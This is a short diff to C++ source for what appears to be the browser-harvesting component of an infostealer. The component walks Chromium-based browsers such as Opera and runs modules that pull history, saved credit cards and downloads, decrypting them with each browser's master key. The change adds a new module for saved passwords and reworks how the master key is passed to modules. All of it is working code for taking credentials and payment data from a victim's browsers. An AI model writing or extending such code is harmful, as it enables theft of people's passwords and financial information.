@@ -6,6 +6,7 @@
 #include "impl/CHistory.h"
 #include "impl/CCreditCards.h"
 #include "impl/CDownloads.h"
+#include "impl/CPasswords.h"
 
 static const std::vector<std::pair<std::string, fs::path>> CHROMIUM_BROWSERS = {
     {"Opera",        Utils::getRoamingPath() / "Opera Software"       / "Opera Stable"               },
@@ -31,6 +32,7 @@ ChromiumBrowsers::ChromiumBrowsers() {
     this->modules.push_back(new CHistory());
     this->modules.push_back(new CCreditCards());
     this->modules.push_back(new CDownloads());
+    this->modules.push_back(new CPasswords());
 }
 
 void ChromiumBrowsers::execute(fs::path &root) {
@@ -53,10 +55,10 @@ void ChromiumBrowsers::execute(fs::path &root) {
 
             for(ChromiumBrowserModule* module : this->modules)
             {
+                module->setMasterKey(master_key);
                 moduleThreads.emplace_back([module, &browser, &browserRoot, &master_key]() {
                     try
                     {
-                        module->setMasterKey(master_key);
                         module->execute(browserRoot, browser.first, browser.second);
                     }
                     catch (const std::exception& e)
